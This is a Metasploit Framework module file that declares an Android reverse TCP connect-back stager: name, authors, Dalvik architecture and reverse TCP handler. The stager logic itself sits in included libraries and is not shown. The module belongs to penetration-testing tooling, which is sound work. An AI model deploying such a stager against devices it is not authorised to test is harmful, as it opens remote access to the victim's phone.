##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/android/reverse_tcp'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Android
  include Msf::Payload::Android::ReverseTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Android Reverse TCP Stager',
      'Description'   => 'Connect back stager',
      'Author'        => ['mihi', 'egypt'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'javasocket',
      'Stager'        => {'Payload' => ''}
      ))
  end
end
